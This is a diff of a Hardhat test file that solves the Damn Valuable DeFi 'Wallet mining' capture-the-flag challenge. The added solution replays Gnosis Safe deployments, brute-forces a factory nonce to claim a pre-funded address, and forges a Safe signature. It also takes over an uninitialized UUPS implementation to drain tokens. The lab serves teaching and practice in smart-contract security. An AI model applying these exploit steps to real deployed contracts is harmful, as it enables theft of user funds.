@@ -1,102 +1,174 @@
-const { ethers, upgrades } = require('hardhat');
-const { expect } = require('chai');
+const { ethers, upgrades } = require("hardhat");
+const { expect } = require("chai");
+const { deployGnosisSafe, incrementNonce, deployGnosisFactory, initialdeployerAddress } = require("./data");
+const { GNOSIS_SAFE_ABI } = require("./gnosisSafeABI");
+const { findNonceForAddress, createInterface, deployContract } = require("./helpers");
 
-describe('[Challenge] Wallet mining', function () {
-    let deployer, player;
-    let token, authorizer, walletDeployer;
-    let initialWalletDeployerTokenBalance;
-    
-    const DEPOSIT_ADDRESS = '0x9b6fb606a9f5789444c17768c6dfcf2f83563801';
-    const DEPOSIT_TOKEN_AMOUNT = 20000000n * 10n ** 18n;
+describe("[Challenge] Wallet mining", function () {
+  let deployer, player;
+  let token, authorizer, walletDeployer;
+  let initialWalletDeployerTokenBalance;
 
-    before(async function () {
-        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
-        [ deployer, ward, player ] = await ethers.getSigners();
+  const DEPOSIT_ADDRESS = "0x9b6fb606a9f5789444c17768c6dfcf2f83563801";
+  const DEPOSIT_TOKEN_AMOUNT = 20000000n * 10n ** 18n;
 
-        // Deploy Damn Valuable Token contract
-        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
+  before(async function () {
+    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
+    [deployer, ward, player] = await ethers.getSigners();
 
-        // Deploy authorizer with the corresponding proxy
-        authorizer = await upgrades.deployProxy(
-            await ethers.getContractFactory('AuthorizerUpgradeable', deployer),
-            [ [ ward.address ], [ DEPOSIT_ADDRESS ] ], // initialization data
-            { kind: 'uups', initializer: 'init' }
-        );
-        
-        expect(await authorizer.owner()).to.eq(deployer.address);
-        expect(await authorizer.can(ward.address, DEPOSIT_ADDRESS)).to.be.true;
-        expect(await authorizer.can(player.address, DEPOSIT_ADDRESS)).to.be.false;
+    // Deploy Damn Valuable Token contract
+    token = await (await ethers.getContractFactory("DamnValuableToken", deployer)).deploy();
 
-        // Deploy Safe Deployer contract
-        walletDeployer = await (await ethers.getContractFactory('WalletDeployer', deployer)).deploy(
-            token.address
-        );
-        expect(await walletDeployer.chief()).to.eq(deployer.address);
-        expect(await walletDeployer.gem()).to.eq(token.address);
-        
-        // Set Authorizer in Safe Deployer
-        await walletDeployer.rule(authorizer.address);
-        expect(await walletDeployer.mom()).to.eq(authorizer.address);
+    // Deploy authorizer with the corresponding proxy
+    authorizer = await upgrades.deployProxy(
+      await ethers.getContractFactory("AuthorizerUpgradeable", deployer),
+      [[ward.address], [DEPOSIT_ADDRESS]], // initialization data
+      { kind: "uups", initializer: "init" }
+    );
 
-        await expect(walletDeployer.can(ward.address, DEPOSIT_ADDRESS)).not.to.be.reverted;
-        await expect(walletDeployer.can(player.address, DEPOSIT_ADDRESS)).to.be.reverted;
+    expect(await authorizer.owner()).to.eq(deployer.address);
+    expect(await authorizer.can(ward.address, DEPOSIT_ADDRESS)).to.be.true;
+    expect(await authorizer.can(player.address, DEPOSIT_ADDRESS)).to.be.false;
 
-        // Fund Safe Deployer with tokens
-        initialWalletDeployerTokenBalance = (await walletDeployer.pay()).mul(43);
-        await token.transfer(
-            walletDeployer.address,
-            initialWalletDeployerTokenBalance
-        );
+    // Deploy Safe Deployer contract
+    walletDeployer = await (await ethers.getContractFactory("WalletDeployer", deployer)).deploy(token.address);
+    expect(await walletDeployer.chief()).to.eq(deployer.address);
+    expect(await walletDeployer.gem()).to.eq(token.address);
 
-        // Ensure these accounts start empty
-        expect(await ethers.provider.getCode(DEPOSIT_ADDRESS)).to.eq('0x');
-        expect(await ethers.provider.getCode(await walletDeployer.fact())).to.eq('0x');
-        expect(await ethers.provider.getCode(await walletDeployer.copy())).to.eq('0x');
+    // Set Authorizer in Safe Deployer
+    await walletDeployer.rule(authorizer.address);
+    expect(await walletDeployer.mom()).to.eq(authorizer.address);
 
-        // Deposit large amount of DVT tokens to the deposit address
-        await token.transfer(DEPOSIT_ADDRESS, DEPOSIT_TOKEN_AMOUNT);
+    await expect(walletDeployer.can(ward.address, DEPOSIT_ADDRESS)).not.to.be.reverted;
+    await expect(walletDeployer.can(player.address, DEPOSIT_ADDRESS)).to.be.reverted;
 
-        // Ensure initial balances are set correctly
-        expect(await token.balanceOf(DEPOSIT_ADDRESS)).eq(DEPOSIT_TOKEN_AMOUNT);
-        expect(await token.balanceOf(walletDeployer.address)).eq(
-            initialWalletDeployerTokenBalance
-        );
-        expect(await token.balanceOf(player.address)).eq(0);
-    });
+    // Fund Safe Deployer with tokens
+    initialWalletDeployerTokenBalance = (await walletDeployer.pay()).mul(43);
+    await token.transfer(walletDeployer.address, initialWalletDeployerTokenBalance);
 
-    it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
-    });
+    // Ensure these accounts start empty
+    expect(await ethers.provider.getCode(DEPOSIT_ADDRESS)).to.eq("0x");
+    expect(await ethers.provider.getCode(await walletDeployer.fact())).to.eq("0x");
+    expect(await ethers.provider.getCode(await walletDeployer.copy())).to.eq("0x");
 
-    after(async function () {
-        /** SUCCESS CONDITIONS */
+    // Deposit large amount of DVT tokens to the deposit address
+    await token.transfer(DEPOSIT_ADDRESS, DEPOSIT_TOKEN_AMOUNT);
 
-        // Factory account must have code
-        expect(
-            await ethers.provider.getCode(await walletDeployer.fact())
-        ).to.not.eq('0x');
+    // Ensure initial balances are set correctly
+    expect(await token.balanceOf(DEPOSIT_ADDRESS)).eq(DEPOSIT_TOKEN_AMOUNT);
+    expect(await token.balanceOf(walletDeployer.address)).eq(initialWalletDeployerTokenBalance);
+    expect(await token.balanceOf(player.address)).eq(0);
+  });
 
-        // Master copy account must have code
-        expect(
-            await ethers.provider.getCode(await walletDeployer.copy())
-        ).to.not.eq('0x');
+  it("Execution", async function () {
+    /** CODE YOUR SOLUTION HERE */
 
-        // Deposit account must have code
-        expect(
-            await ethers.provider.getCode(DEPOSIT_ADDRESS)
-        ).to.not.eq('0x');
-        
-        // The deposit address and the Safe Deployer contract must not hold tokens
-        expect(
-            await token.balanceOf(DEPOSIT_ADDRESS)
-        ).to.eq(0);
-        expect(
-            await token.balanceOf(walletDeployer.address)
-        ).to.eq(0);
+    // 1. Feed the original deployer wallet with some ether
+    await player.sendTransaction({ to: initialdeployerAddress, value: ethers.utils.parseEther("0.5") });
 
-        // Player must own all tokens
-        expect(
-            await token.balanceOf(player.address)
-        ).to.eq(initialWalletDeployerTokenBalance.add(DEPOSIT_TOKEN_AMOUNT)); 
-    });
+    // 2. Replay the GnosisSafe and GnosisFactory transactions (look on Etherscan for raw transactions hex)
+    const safeAddress = await deployContract(deployGnosisSafe);
+    await ethers.provider.sendTransaction(incrementNonce); // Increment nonce without waiting for receipt
+    const factoryAddress = await deployContract(deployGnosisFactory);
+
+    console.log("Safe Address: ", safeAddress);
+    console.log("Factory Address: ", factoryAddress);
+
+    // 3. Connect to the GnosisSafeProxyFactory contract
+    const proxyFactory = await ethers.getContractAt("GnosisSafeProxyFactory", factoryAddress, player);
+
+    // 4. Create setup data for proxy creation
+    const setupData = createInterface(GNOSIS_SAFE_ABI, "setup", [
+      [player.address],
+      1,
+      ethers.constants.AddressZero,
+      0,
+      ethers.constants.AddressZero,
+      ethers.constants.AddressZero,
+      0,
+      ethers.constants.AddressZero,
+    ]);
+
+    // 5. Get the nonce that returns the address: 0x9b6fb606a9f5789444c17768c6dfcf2f83563801
+    const nonce = findNonceForAddress(factoryAddress, DEPOSIT_ADDRESS);
+
+    // 6. Create 43 dummy tx to match the nonce
+    for (let i = 0; i < nonce; i++) {
+      await proxyFactory.createProxy(safeAddress, setupData);
+    }
+
+    // 7. Create the tx to transfer all tokens to player address
+    const tokenABI = ["function transfer(address to, uint256 amount)"];
+    const tokenABIData = createInterface(tokenABI, "transfer", [player.address, DEPOSIT_TOKEN_AMOUNT]);
+    const depositAddrSafe = await ethers.getContractAt("GnosisSafe", DEPOSIT_ADDRESS, player);
+
+    const txParams = [
+      token.address,
+      0,
+      tokenABIData,
+      0,
+      0,
+      0,
+      0,
+      ethers.constants.AddressZero,
+      ethers.constants.AddressZero,
+      0,
+    ];
+
+    // 8. Get the tx hash generated by the contract
+    // getTransactionHash() - https://github.com/safe-global/safe-contracts/blob/v1.1.1/contracts/GnosisSafe.sol#L398
+    const txhash = await depositAddrSafe.getTransactionHash(...txParams);
+    const signed = await player.signMessage(ethers.utils.arrayify(txhash));
+
+    // Increase v by 4
+    const signedIncreaseV = ethers.BigNumber.from(signed).add(4).toHexString();
+
+    // 9. Transfer all tokens to player address
+    await depositAddrSafe.execTransaction(...txParams.slice(0, -1), signedIncreaseV);
+
+    const playerTokenBalance = await token.balanceOf(player.address);
+    console.log("New player token balance: ", ethers.utils.formatEther(playerTokenBalance).toString());
+
+    const Attack13 = await ethers.getContractFactory("Attack13", deployer);
+    const attack13 = await Attack13.deploy();
+
+    // initialise implementation address (Slot from EIP-1967 https://eips.ethereum.org/EIPS/eip-1967)
+    const implementationSlot = "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc";
+    const implementationAddress =
+      "0x" + (await ethers.provider.getStorageAt(authorizer.address, implementationSlot)).slice(-40);
+    const impContract = await ethers.getContractAt("AuthorizerUpgradeable", implementationAddress, player);
+
+    // Create ABI to delegate call
+    const attackABI = ["function attack()"];
+    const IAttack = createInterface(attackABI, "attack", []);
+
+    // Init implementation to claim ownership & upgrade to attacking contract
+    await impContract.init([], []);
+    await impContract.upgradeToAndCall(attack13.address, IAttack);
+
+    // Deploy 43 Wallets via walletDeployer to retrieve all 43 tokens
+    for (let i = 0; i < 43; i++) {
+      await (await walletDeployer.connect(player).drop(setupData)).wait();
+    }
+  });
+
+  after(async function () {
+    /** SUCCESS CONDITIONS */
+
+    // Factory account must have code
+    expect(await ethers.provider.getCode(await walletDeployer.fact())).to.not.eq("0x");
+
+    // Master copy account must have code
+    expect(await ethers.provider.getCode(await walletDeployer.copy())).to.not.eq("0x");
+
+    // Deposit account must have code
+    expect(await ethers.provider.getCode(DEPOSIT_ADDRESS)).to.not.eq("0x");
+
+    // The deposit address and the Safe Deployer contract must not hold tokens
+    expect(await token.balanceOf(DEPOSIT_ADDRESS)).to.eq(0);
+    expect(await token.balanceOf(walletDeployer.address)).to.eq(0);
+
+    // Player must own all tokens
+    expect(await token.balanceOf(player.address)).to.eq(initialWalletDeployerTokenBalance.add(DEPOSIT_TOKEN_AMOUNT));
+  });
 });
